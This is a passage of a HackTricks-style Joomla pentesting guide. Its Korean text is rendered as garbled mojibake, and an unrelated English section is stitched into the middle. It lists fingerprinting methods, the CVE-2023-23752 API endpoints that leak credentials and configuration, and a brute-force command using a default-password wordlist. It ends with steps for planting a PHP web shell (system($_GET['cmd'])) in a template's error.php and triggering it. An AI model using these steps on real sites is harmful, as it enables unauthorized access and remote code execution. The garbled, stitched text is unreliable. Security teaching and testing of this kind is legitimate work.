# Joomla

<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ **ë˜ê¸¸ ì›í•˜ì‹œë‚˜ìš”? í˜¹ì€ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”, ì €í¬ì˜ ë…ì  [**NFT ì»¬ë ‰ì…˜**](https://opensea.io/collection/the-peass-family)
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”
* **[ğŸ’¬](https://emojipedia.org/speech-balloon/) Discord ê·¸ë£¹**ì— **ê°€ì…**í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ê³  ì‹¶ìœ¼ì‹œë‹¤ë©´ [hacktricks repo](https://github.com/carlospolop/hacktricks) ë° [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ë¡œ PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

### Joomla í†µê³„

JoomlaëŠ” Joomla ì„¤ì¹˜ì—ì„œ ì‚¬ìš© ì¤‘ì¸ Joomla, PHP ë° ë°ì´í„°ë² ì´ìŠ¤ ë²„ì „ ë° ì„œë²„ ìš´ì˜ ì²´ì œì˜ ë¶„í•´ì™€ ê°™ì€ ì¼ë¶€ ìµëª…ì˜ [ì‚¬ìš© í†µê³„](https://developer.joomla.org/about/stats.html)ë¥¼ ìˆ˜ì§‘í•©ë‹ˆë‹¤. ì´ ë°ì´í„°ëŠ” ê³µê°œ [API](https://developer.joomla.org/about/stats/api.html)ë¥¼ í†µí•´ ì¿¼ë¦¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

{
"data": {
"cms_version": {
"3.0": 0,
"3.1": 0,
"3.10": 6.33,
"3.2": 0.01,
"3.3": 0.02,
"3.4": 0.05,
"3.5": 12.24,
"3.6": 22.85,
"3.7": 7.99,
"3.8": 17.72,
"3.9": 27.24,
"4.0": 3.21,
"4.1": 1.53,
"4.2": 0.82,
"4.3": 0,
"5.0": 0
},
"total": 2951032
}
}
```
## ì—´ê±°

### ë°œê²¬/í’‹í”„ë¦°íŒ…

* **ë©”íƒ€**ë¥¼ í™•ì¸í•˜ì„¸ìš”.
```bash
curl https://www.joomla.org/ | grep Joomla | grep generator

<meta name="generator" content="Joomla! - Open Source Content Management" />
```
* ë¡œë´‡.txt
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
[...]
```
* README.txt

## Joomla

### Joomla Configuration File

The Joomla configuration file `configuration.php` contains sensitive information such as database credentials. It is located in the root directory of the Joomla installation.

### Finding Joomla Version

To find the Joomla version, you can look for the version number in the `README.txt` file or check the `generator` meta tag in the website's source code.

### Exploiting Joomla Vulnerabilities

Exploiting known vulnerabilities in Joomla can provide unauthorized access to the website. It is important to keep Joomla and its extensions up to date to prevent exploitation.

### Joomla Security Scanner

Using a Joomla security scanner can help identify security issues in a Joomla website. Tools like JoomScan can be used to scan for vulnerabilities and misconfigurations.

### Brute Forcing Joomla Login

Brute forcing the Joomla login page can be attempted using tools like Hydra or Burp Suite to crack weak passwords and gain unauthorized access to the Joomla admin panel.
```
1- What is this?
* This is a Joomla! installation/upgrade package to version 3.x
* Joomla! Official site: https://www.joomla.org
* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```
### ë²„ì „

* **/administrator/manifests/files/joomla.xml**ì—ì„œ ë²„ì „ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **/language/en-GB/en-GB.xml**ì—ì„œ Joomlaì˜ ë²„ì „ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **plugins/system/cache/cache.xml**ì—ì„œ ëŒ€ëµì ì¸ ë²„ì „ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ìë™
```bash
droopescan scan joomla --url http://joomla-site.local/
```
### API ì¸ì¦ë˜ì§€ ì•Šì€ ì •ë³´ ë…¸ì¶œ:
ë²„ì „ 4.0.0ë¶€í„° 4.2.7ê¹Œì§€ëŠ” ì¸ì¦ë˜ì§€ ì•Šì€ ì •ë³´ ë…¸ì¶œ ì·¨ì•½ì  (CVE-2023-23752)ì— ì·¨ì•½í•˜ì—¬ ìê²© ì¦ëª… ë° ê¸°íƒ€ ì •ë³´ë¥¼ ëˆ„ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

* ì‚¬ìš©ì: `http://<í˜¸ìŠ¤íŠ¸>/api/v1/users?public=true`

* êµ¬ì„± íŒŒì¼: `http://<í˜¸ìŠ¤íŠ¸>/api/index.php/v1/config/application?public=true`

**MSF ëª¨ë“ˆ**: `scanner/http/joomla_api_improper_access_checks` ë˜ëŠ” ë£¨ë¹„ ìŠ¤í¬ë¦½íŠ¸: [51334](https://www.exploit-db.com/exploits/51334)

### ë¸Œë£¨íŠ¸ í¬ìŠ¤

ë¡œê·¸ì¸ì„ ë¸Œë£¨íŠ¸ í¬ìŠ¤í•˜ê¸° ìœ„í•´ [ì´ ìŠ¤í¬ë¦½íŠ¸](https://github.com/ajnik/joomla-bruteforce)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```shell-session
sudo python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

admin:admin
```
## RCE

ë§Œì•½ **ê´€ë¦¬ì ìê²© ì¦ëª…**ì„ íšë“¤í–ˆë‹¤ë©´ **PHP ì½”ë“œ ì¡°ê°ì„ ì¶”ê°€**í•˜ì—¬ **RCEì— ë“¤ì–´ê°ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì´ë¥¼ ìœ„í•´ **í…œí”Œë¦¿ì„ ì‚¬ìš©ì ì •ì˜**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

1. `êµ¬ì„±` ì•„ë˜ **`í…œí”Œë¦¿`**ì„ í´ë¦­í•˜ì—¬ í…œí”Œë¦¿ ë©”ë‰´ë¥¼ ì—½ë‹ˆë‹¤.
2. `í…œí”Œë¦¿` ì—´ ì•„ë˜ **`protostar`**ë¥¼ ì„ íƒí•˜ì—¬ **`í…œí”Œë¦¿: ì‚¬ìš©ì ì •ì˜`** í˜ì´ì§€ë¡œ ì´ë™í•©ë‹ˆë‹¤.
3. ë§ˆì§€ë§‰ìœ¼ë¡œ **í˜ì´ì§€ ì†ŒìŠ¤**ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ í˜ì´ì§€ë¥¼ í´ë¦­í•©ë‹ˆë‹¤. **`error.php`** í˜ì´ì§€ë¥¼ ì„ íƒí•´ë´…ì‹œë‹¤. ë‹¤ìŒê³¼ ê°™ì´ **PHP í•œ ì¤„ë¡œ ì½”ë“œ ì‹¤í–‰ì„ ì–»ê¸° ìœ„í•œ ì½”ë“œë¥¼ ì¶”ê°€**í•©ë‹ˆë‹¤:
   - **`system($_GET['cmd']);`**
4. **ì €ì¥ ë° ë‹«ê¸°**
5. `curl -s http://joomla-site.local/templates/protostar/error.php?cmd=id`
